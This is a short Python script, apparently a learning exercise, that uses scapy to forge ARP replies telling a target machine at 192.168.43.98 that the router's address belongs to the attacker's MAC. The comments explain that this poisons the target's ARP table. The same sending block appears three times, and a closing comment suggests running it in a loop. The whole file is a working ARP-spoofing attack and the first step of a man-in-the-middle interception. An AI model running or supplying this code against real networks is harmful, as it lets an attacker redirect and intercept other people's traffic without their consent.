import scapy.all as scapy
packet  = scapy.ARP()
packet.op = 2 # default value is 1, 1 is for ARP request. But we are creating ARP response
packet.pdst =  "192.168.43.98"  #target ip(Destination ip)
packet.hwdst = "c4:0b:cb:59:2f:f5" # target mac
packet.psrc = "192.168.43.1"  #ip of router
# Above packet is configured to send to target ip saying that it's the router
# ARP is at 80:a5:89:87:2e:bb(Attackers mac) says 192.168.43.1

#after sending this packet,the arp table of target is changed
#and the mac address for router ip is changed to attackers ip
scapy.send(packet)




packet  = scapy.ARP()
packet.op = 2 # default value is 1, 1 is for ARP request. But we are creating ARP response
packet.pdst =  "192.168.43.98"  #target ip(Destination ip)
packet.hwdst = "c4:0b:cb:59:2f:f5" # target mac
packet.psrc = "192.168.43.1"  #ip of router
# Above packet is configured to send to target ip saying that it's the router
# ARP is at 80:a5:89:87:2e:bb(Attackers mac) says 192.168.43.1

#after sending this packet,the arp table of target is changed
#and the mac address for router ip is changed to attackers ip
scapy.send(packet)


packet  = scapy.ARP()
packet.op = 2 # default value is 1, 1 is for ARP request. But we are creating ARP response
packet.pdst =  "192.168.43.98"  #target ip(Destination ip)
packet.hwdst = "c4:0b:cb:59:2f:f5" # target mac
packet.psrc = "192.168.43.1"  #ip of router
# Above packet is configured to send to target ip saying that it's the router
# ARP is at 80:a5:89:87:2e:bb(Attackers mac) says 192.168.43.1

#after sending this packet,the arp table of target is changed
#and the mac address for router ip is changed to attackers ip
scapy.send(packet)


#Run the packet send in a loop



